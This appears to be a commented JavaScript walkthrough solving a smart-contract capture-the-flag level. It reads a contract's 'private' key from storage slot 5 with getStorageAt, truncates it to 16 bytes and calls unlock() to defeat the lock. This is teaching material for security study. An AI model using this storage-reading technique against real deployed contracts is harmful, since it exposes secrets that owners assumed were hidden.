await contract.locked();
// >> returns true

// Like in Level 8 - Vault, we use the web3.eth.getStorageAt() function to read
//  the data at private variables

// Each smart contract has storage in the form of an array of 2^(256) 32-byte
//  values, all initialized to zero.

// So if we carefully go through how each of the state variables are declared,
//  we can workout where to find the key

// locked -- storage[0] (takes up 32 bytes)
// ID -- storage[1] (256 bits / 8 bits/byte = 32 bytes)
// flattening, denomination, awkwardness -- storage[2] (8+8+16 = 32 bits = 4 bytes -- fit into a 32-byte slot)
// data[0:1] -- storage[3:4] (each element is 32 bytes)
// data[2] -- storage[5]

let key_32b = await web3.eth.getStorageAt(instance, 5);
// >> returns a 32-byte value

// Note that a downcasting from bytes32 to bytes16 will remove the rightmost 16
//  bytes from the value

// We have to manually do this in JS before passing to the unlock() method
//  -- we can use the JS slice(from, to) method on key_32b (which is a String) to do
//  this -- slice(from, to) is not inclusive for the to index

// Be sure to remember that the initial "0x" is not included in the 32 bytes

// Also recall that 2 hexadecimal digits == 1 bytes

let key_16b = key_32b.slice(0, 34);
// >> returns key_32b with the upper 16 bytes truncated

// unlock the contract by calling unlock() and passing the key we found
await contract.unlock(key_16b);

await contract.locked();
// >> returns false

// submit

// Tutorial to read "private" data: https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925
